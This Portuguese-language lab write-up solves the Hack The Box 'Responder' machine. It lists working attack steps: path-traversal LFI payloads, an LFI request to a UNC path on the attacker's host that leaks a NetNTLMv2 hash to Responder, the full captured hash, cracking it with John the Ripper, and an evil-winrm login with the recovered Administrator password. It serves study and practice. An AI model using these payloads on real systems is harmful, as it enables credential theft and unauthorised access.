# Guia de Resolução: Hack The Box - Responder

Este documento é um guia de estudo para o desafio "Responder". Ele detalha uma cadeia de exploração que envolve uma vulnerabilidade de Inclusão de Arquivo Local (LFI) em uma aplicação web rodando em um servidor Windows. Essa LFI é usada para forçar o servidor a tentar se autenticar em um compartilhamento SMB malicioso controlado pelo atacante, permitindo a captura de um hash NetNTLMv2. Este hash é então quebrado para obter a senha do administrador, que por sua vez é usada para acessar o sistema via WinRM.

---

## Introdução: LFI, NetNTLMv2 e Responder

*   **Inclusão de Arquivo Local (LFI):** Uma vulnerabilidade web que permite a um atacante incluir arquivos do sistema de arquivos do servidor na resposta da página web. Se não houver sanitização adequada da entrada do usuário usada para especificar o arquivo a ser incluído, um atacante pode ler arquivos sensíveis ou, como neste caso, forçar o servidor a interagir com recursos externos.
*   **NetNTLMv2:** Um protocolo de autenticação desafio-resposta usado em redes Windows. Quando um cliente tenta acessar um recurso que requer autenticação NTLM, ocorre uma troca de mensagens (desafio e resposta criptografada) que, se capturada, pode ser alvo de ataques de quebra de senha offline. O "hash NetNTLMv2" não é um hash de senha armazenado, mas sim o resultado dessa troca.
*   **Responder:** Uma ferramenta popular para ataques de envenenamento LLMNR, NBT-NS e mDNS, e para configurar servidores maliciosos (HTTP, SMB, etc.) para capturar credenciais, incluindo hashes NetNTLMv2.

Este laboratório combina esses conceitos: um LFI é usado para fazer o servidor Windows tentar acessar um caminho UNC (ex: `\\IP_DO_ATACANTE\arquivo`), o que dispara uma tentativa de autenticação SMB. O Responder, rodando na máquina do atacante, atua como o servidor SMB malicioso e captura o hash NetNTLMv2.

---

## Fase 1: Enumeração Inicial e Descoberta da Aplicação Web

Identificamos os serviços e analisamos a aplicação web em busca de pontos de entrada.

### 1. Explicação Didática

> Imagine que você está investigando um prédio (o servidor Windows). Primeiro, você verifica todas as portas para ver o que está acessível (scan `nmap`). Você encontra uma entrada principal (servidor web na porta 80) e uma porta de serviço dos fundos (WinRM na porta 5985). Ao explorar a entrada principal, você percebe que ela tem um sistema de entrega de documentos (o parâmetro `page` na URL) que parece aceitar qualquer endereço de documento que você fornecer.

### 2. Explicação Técnica (Passo a Passo)

1.  **Enumeração de Portas e Serviços:** Utilizamos o `nmap`.

    *   **Comando:**
        ```bash
        nmap -p- --min-rate 1000 -sV {IP_DO_ALVO}
        ```
    *   **Explicação dos Parâmetros:**
        *   `nmap`: A ferramenta.
        *   `-p-`: Escaneia todas as 65535 portas TCP.
        *   `--min-rate 1000`: Define uma taxa mínima de envio de pacotes para acelerar o scan.
        *   `-sV`: Tenta identificar a versão dos serviços.
        *   `{IP_DO_ALVO}`: O IP da máquina "Responder".

    *   **Resultado:**
        *   **Porta 80/tcp (HTTP):** `Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)`.
        *   **Porta 5985/tcp (HTTP):** `Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)`. Esta é a porta padrão para WinRM (Windows Remote Management).

2.  **Enumeração da Aplicação Web (Porta 80):**
    *   Ao tentar acessar `http://{IP_DO_ALVO}`, o navegador é redirecionado para `http://unika.htb` e falha, pois `unika.htb` não é resolvido. Isso indica o uso de Name-Based Virtual Hosting.
    *   **Modificar o arquivo `/etc/hosts` (na máquina atacante):** Para acessar o site, adicionamos uma entrada ao nosso arquivo `/etc/hosts` local.
        ```bash
        echo "{IP_DO_ALVO} unika.htb" | sudo tee -a /etc/hosts
        ```
        Isso faz com que nosso sistema resolva `unika.htb` para o `{IP_DO_ALVO}`.
    *   Acessando `http://unika.htb` agora carrega uma página de negócios.
    *   Observa-se uma opção de idioma. Clicar em "FR" (Francês) muda a URL para:
        `http://unika.htb/index.php?page=french.html`
        O parâmetro `page` carregando `french.html` é um forte indicador de uma potencial vulnerabilidade LFI.

---

## Vulnerabilidade 1: Inclusão de Arquivo Local (LFI)

A aplicação usa o parâmetro `page` para incluir arquivos, mas não sanitiza adequadamente essa entrada.

### 1. Explicação Didática

> O sistema de entrega de documentos da recepção (o parâmetro `page`) é ingênuo. Se você pedir para ele buscar o documento "french.html", ele busca. Se você pedir para ele buscar "um arquivo confidencial do sistema", ele também tenta buscar, sem questionar se deveria.

### 2. Explicação Técnica (Passo a Passo)

1.  **Teste de LFI para Ler Arquivos Locais:** Tentamos incluir um arquivo conhecido do sistema Windows para confirmar o LFI. O arquivo `C:\windows\system32\drivers\etc\hosts` é um bom candidato.

    *   **Payload LFI:**
        ```
        http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
        ```
        Os `../` são usados para "subir" na estrutura de diretórios a partir do diretório onde `index.php` está localizado, até alcançar a raiz do disco (C:\), e então navegar até o arquivo `hosts`.
    *   **Resultado:** O conteúdo do arquivo `hosts` do servidor Windows é exibido na página, confirmando a vulnerabilidade LFI. A função `include()` do PHP está sendo usada no backend sem validação adequada.

---

## Vulnerabilidade 2: Captura de Hash NetNTLMv2 via LFI e Responder

A LFI pode ser usada não apenas para ler arquivos locais, mas também para fazer o servidor tentar incluir um arquivo de um caminho UNC (Universal Naming Convention), como um compartilhamento SMB. Quando um servidor Windows tenta acessar um recurso SMB, ele tenta se autenticar.

### 1. Explicação Didática

> Agora que sabemos que podemos fazer o sistema de entrega buscar qualquer "documento", pedimos a ele para buscar um documento de um "endereço de rede" que controlamos (nosso servidor SMB malicioso configurado com o Responder). Quando o sistema de entrega tenta pegar esse documento, ele precisa se "identificar" (autenticação NTLM). Nós (com o Responder) registramos essa tentativa de identificação (capturamos o hash NetNTLMv2).

### 2. Explicação Técnica (Passo a Passo)

1.  **Configuração do Responder (na máquina atacante):**
    *   O Responder precisa ser configurado para escutar por tentativas de conexão SMB.
    *   Clone o repositório se ainda não o tiver:
        ```bash
        git clone https://github.com/lgandx/Responder.git
        ```
    *   Verifique se o SMB está habilitado no `Responder.conf` (geralmente está por padrão):
        ```
        [Responder Core]
        ...
        SMB = On
        ...
        ```
    *   Inicie o Responder, especificando a interface de rede correta (ex: `tun0` para VPNs HTB, `eth0` para redes locais).
        ```bash
        sudo python3 Responder.py -I tun0
        ```
        (Ou `sudo responder -I tun0` se instalado como um utilitário do sistema).
        O Responder agora está escutando por conexões, incluindo SMB.

2.  **Exploração do LFI para Forçar Autenticação SMB:**
    Usamos a vulnerabilidade LFI para fazer o servidor web (rodando como um usuário no sistema Windows) tentar acessar um caminho UNC que aponta para o IP da nossa máquina atacante (onde o Responder está escutando).

    *   **Payload LFI com Caminho UNC:**
        ```
        http://unika.htb/index.php?page=//{IP_DO_ATACANTE}/qualquercoisa
        ```
        *   `{IP_DO_ATACANTE}`: O IP da sua máquina onde o Responder está rodando.
        *   `qualquercoisa`: Pode ser qualquer nome de arquivo, pois o objetivo não é realmente carregar o arquivo, mas sim disparar a tentativa de autenticação.

3.  **Captura do Hash NetNTLMv2 pelo Responder:**
    *   Quando o servidor Windows tenta acessar `\\{IP_DO_ATACANTE}\qualquercoisa`, ele envia uma solicitação de autenticação NTLM para o Responder.
    *   O Responder captura essa tentativa e exibe o hash NetNTLMv2 do usuário sob o qual o servidor web está sendo executado.
    *   **Exemplo de Saída do Responder:**
        ```
        [SMB] NTMLv2-SSP Client     : {IP_DO_ALVO_WINDOWS}
        [SMB] NTMLv2-SSP Username  : DESKTOP-H30F232\Administrator
        [SMB] NTMLv2-SSP Hash      : Administrator::DESKTOP-H30F232:1122334455667788:7E0A87A2C... (hash longo) ...
        ```
        O hash capturado é para o usuário `Administrator`.

---

## Fase 3: Quebra do Hash NetNTLMv2 e Acesso via WinRM

Com o hash NetNTLMv2 em mãos, usamos uma ferramenta de quebra de senha para tentar encontrar a senha original.

### 1. Explicação Didática

> A "identificação" que registramos (o hash NetNTLMv2) é como uma fechadura complexa. Não podemos abri-la diretamente, mas podemos pegar um molho de chaves comuns (uma wordlist) e testar uma por uma (com o John the Ripper) até encontrar a chave que abre essa fechadura específica. Uma vez que temos a chave (a senha), podemos usá-la na porta de serviço dos fundos (WinRM) para entrar no sistema.

### 2. Explicação Técnica (Passo a Passo)

1.  **Salvar o Hash em um Arquivo:**
    Copie o hash NetNTLMv2 completo capturado pelo Responder e salve-o em um arquivo (ex: `hash.txt`).
    ```bash
    echo "Administrator::DESKTOP-H30F232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D801F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E00480045003800440049003400410053004300510004003400570049004E002D004E0048004500380044004900340041005300430051002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C004F00430041004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D8010600040002000000080030003000000000000000001000000002000000C2FAF941D04DCECC6A7691EA92630A77E073056DA8C3F356D47C324C6D6D16F0A0010000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000" > hash.txt
    ```

2.  **Quebrar o Hash com John the Ripper:**
    Usamos o John the Ripper (ou Hashcat) com uma wordlist (como `rockyou.txt`) para tentar encontrar a senha.
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ```
    *   `john`: O programa John the Ripper.
    *   `--wordlist=/usr/share/wordlists/rockyou.txt`: Especifica o caminho para a wordlist.
    *   `hash.txt`: O arquivo contendo o hash NetNTLMv2.
    *   John tentará cada senha da wordlist, calculará o desafio-resposta NetNTLMv2 correspondente e o comparará com o hash capturado.
    *   **Resultado:** John encontra a senha: `badminton`.

3.  **Acesso via WinRM com as Credenciais Obtidas:**
    Agora que temos o nome de usuário (`Administrator`) e a senha (`badminton`), podemos tentar acessar o sistema via WinRM usando uma ferramenta como `evil-winrm`.

    *   **Comando:**
        ```bash
        evil-winrm -i {IP_DO_ALVO} -u Administrator -p badminton
        ```
    *   **Explicação dos Parâmetros:**
        *   `evil-winrm`: A ferramenta cliente WinRM.
        *   `-i {IP_DO_ALVO}`: O IP do servidor Windows.
        *   `-u Administrator`: O nome de usuário.
        *   `-p badminton`: A senha que foi quebrada.

    *   **Resultado:** Conexão bem-sucedida. Obtemos um prompt do PowerShell no sistema alvo:
        `*Evil-WinRM* PS C:\Users\Administrator\Documents>`

4.  **Captura da Flag:**
    O write-up indica que a flag está em `C:\Users\mike\Desktop\flag.txt`. (Nota: O usuário logado é Administrator, mas a flag está no desktop de 'mike'. Isso pode ser um pequeno detalhe do CTF ou implicar que o usuário Administrator tem acesso a outros diretórios de usuário).

    *   Navegue até o diretório e exiba a flag:
        ```powershell
        *Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\mike\Desktop
        *Evil-WinRM* PS C:\Users\mike\Desktop> dir
        *Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
        ```
    *   O conteúdo do `flag.txt` é a flag final.

---

Este desafio demonstra uma cadeia de exploração sofisticada, combinando LFI, captura de hash NetNTLMv2 e quebra de senha para obter acesso administrativo a um sistema Windows.